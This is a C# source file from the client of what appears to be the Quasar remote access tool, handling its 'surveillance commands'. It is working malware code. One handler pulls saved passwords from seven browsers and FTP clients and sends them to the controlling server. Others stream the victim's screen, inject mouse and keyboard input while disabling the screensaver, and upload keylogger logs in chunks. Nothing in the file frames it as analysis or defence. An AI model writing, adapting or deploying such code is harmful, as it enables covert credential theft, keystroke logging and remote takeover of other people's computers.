﻿using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using xClient.Core.Helper;
using System.Drawing.Imaging;
using System.Threading;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using System.Collections.Generic;
using Quasar.Common.Enums;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using xClient.Core.Data;
using xClient.Core.Recovery.Browsers;
using xClient.Core.Recovery.FtpClients;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
    public static partial class CommandHandler
    {
        public static void HandleGetPasswords(GetPasswords packet, Client client)
        {
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();

            recovered.AddRange(Chrome.GetSavedPasswords());
            recovered.AddRange(Opera.GetSavedPasswords());
            recovered.AddRange(Yandex.GetSavedPasswords());
            recovered.AddRange(InternetExplorer.GetSavedPasswords());
            recovered.AddRange(Firefox.GetSavedPasswords());
            recovered.AddRange(FileZilla.GetSavedPasswords());
            recovered.AddRange(WinSCP.GetSavedPasswords());

            List<string> raw = new List<string>();

            foreach (RecoveredAccount value in recovered)
            {
                string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.URL, value.Application, DELIMITER);
                raw.Add(rawValue);
            }

            client.Send(new GetPasswordsResponse {Passwords = raw});
        }

        public static void HandleGetDesktop(GetDesktop command, Client client)
        {
            // TODO: Capture mouse in frames: https://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
            var monitorBounds = ScreenHelper.GetBounds((command.DisplayIndex));
            var resolution = new Resolution {Height = monitorBounds.Height, Width = monitorBounds.Width};

            if (StreamCodec == null)
                StreamCodec = new UnsafeStreamCodec(command.Quality, command.DisplayIndex, resolution);

            if (command.CreateNew || StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.DisplayIndex
                || StreamCodec.Resolution != resolution)
            {
                if (StreamCodec != null)
                    StreamCodec.Dispose();

                StreamCodec = new UnsafeStreamCodec(command.Quality, command.DisplayIndex, resolution);
            }

            BitmapData desktopData = null;
            Bitmap desktop = null;
            try
            {
                desktop = ScreenHelper.CaptureScreen(command.DisplayIndex);
                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                    ImageLockMode.ReadWrite, desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
                    StreamCodec.CodeImage(desktopData.Scan0,
                        new Rectangle(0, 0, desktop.Width, desktop.Height),
                        new Size(desktop.Width, desktop.Height),
                        desktop.PixelFormat, stream);
                    client.Send(new GetDesktopResponse
                    {
                        Image = stream.ToArray(),
                        Quality = StreamCodec.ImageQuality,
                        Monitor = StreamCodec.Monitor,
                        Resolution = StreamCodec.Resolution
                    });
                }
            }
            catch (Exception)
            {
                if (StreamCodec != null)
                {
                    client.Send(new GetDesktopResponse
                    {
                        Image = null,
                        Quality = StreamCodec.ImageQuality,
                        Monitor = StreamCodec.Monitor,
                        Resolution = StreamCodec.Resolution
                    });
                }

                StreamCodec = null;
            }
            finally
            {
                if (desktop != null)
                {
                    if (desktopData != null)
                    {
                        try
                        {
                            desktop.UnlockBits(desktopData);
                        }
                        catch
                        {
                        }
                    }
                    desktop.Dispose();
                }
            }
        }

        public static void HandleDoMouseEvent(DoMouseEvent command, Client client)
        {
            try
            {
                Screen[] allScreens = Screen.AllScreens;
                int offsetX = allScreens[command.MonitorIndex].Bounds.X;
                int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
                Point p = new Point(command.X + offsetX, command.Y + offsetY);

                // Disable screensaver if active before input
                switch (command.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                    case MouseAction.MoveCursor:
                        if (NativeMethodsHelper.IsScreensaverActive())
                            NativeMethodsHelper.DisableScreensaver();
                        break;
                }

                switch (command.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                        NativeMethodsHelper.DoMouseLeftClick(p, command.IsMouseDown);
                        break;
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                        NativeMethodsHelper.DoMouseRightClick(p, command.IsMouseDown);
                        break;
                    case MouseAction.MoveCursor:
                        NativeMethodsHelper.DoMouseMove(p);
                        break;
                    case MouseAction.ScrollDown:
                        NativeMethodsHelper.DoMouseScroll(p, true);
                        break;
                    case MouseAction.ScrollUp:
                        NativeMethodsHelper.DoMouseScroll(p, false);
                        break;
                }
            }
            catch
            {
            }
        }

        public static void HandleDoKeyboardEvent(DoKeyboardEvent command, Client client)
        {
            if (NativeMethodsHelper.IsScreensaverActive())
                NativeMethodsHelper.DisableScreensaver();

            NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
        }

        public static void HandleGetMonitors(GetMonitors command, Client client)
        {
            if (Screen.AllScreens.Length > 0)
            {
                client.Send(new GetMonitorsResponse {Number = Screen.AllScreens.Length});
            }
        }

        public static void HandleGetKeyloggerLogs(GetKeyloggerLogs command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    int index = 1;

                    if (!Directory.Exists(Keylogger.LogDirectory))
                    {
                        client.Send(new GetKeyloggerLogsResponse
                        {
                            Filename = "",
                            Block = new byte[0],
                            MaxBlocks = -1,
                            CurrentBlock = -1,
                            CustomMessage = "",
                            Index = index,
                            FileCount = 0
                        });
                        return;
                    }

                    FileInfo[] iFiles = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();

                    if (iFiles.Length == 0)
                    {
                        client.Send(new GetKeyloggerLogsResponse
                        {
                            Filename = "",
                            Block = new byte[0],
                            MaxBlocks = -1,
                            CurrentBlock = -1,
                            CustomMessage = "",
                            Index = index,
                            FileCount = 0
                        });
                        return;
                    }

                    foreach (FileInfo file in iFiles)
                    {
                        FileSplit srcFile = new FileSplit(file.FullName);

                        if (srcFile.MaxBlocks < 0)
                        {
                            client.Send(new GetKeyloggerLogsResponse
                            {
                                Filename = "",
                                Block = new byte[0],
                                MaxBlocks = -1,
                                CurrentBlock = -1,
                                CustomMessage = srcFile.LastError,
                                Index = index,
                                FileCount = iFiles.Length
                            });
                        }

                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                client.Send(new GetKeyloggerLogsResponse
                                {
                                    Filename = Path.GetFileName(file.Name),
                                    Block = block,
                                    MaxBlocks = srcFile.MaxBlocks,
                                    CurrentBlock = currentBlock,
                                    CustomMessage = srcFile.LastError,
                                    Index = index,
                                    FileCount = iFiles.Length
                                });
                                //Thread.Sleep(200);
                            }
                            else
                            {
                                client.Send(new GetKeyloggerLogsResponse
                                {
                                    Filename = "",
                                    Block = new byte[0],
                                    MaxBlocks = -1,
                                    CurrentBlock = -1,
                                    CustomMessage = srcFile.LastError,
                                    Index = index,
                                    FileCount = iFiles.Length
                                });
                            }
                        }

                        index++;
                    }
                }
                catch (Exception ex)
                {
                    client.Send(new GetKeyloggerLogsResponse
                    {
                        Filename = "",
                        Block = new byte[0],
                        MaxBlocks = -1,
                        CurrentBlock = -1,
                        CustomMessage = ex.Message,
                        Index = -1,
                        FileCount = -1
                    });
                }
            }).Start();
        }
    }
}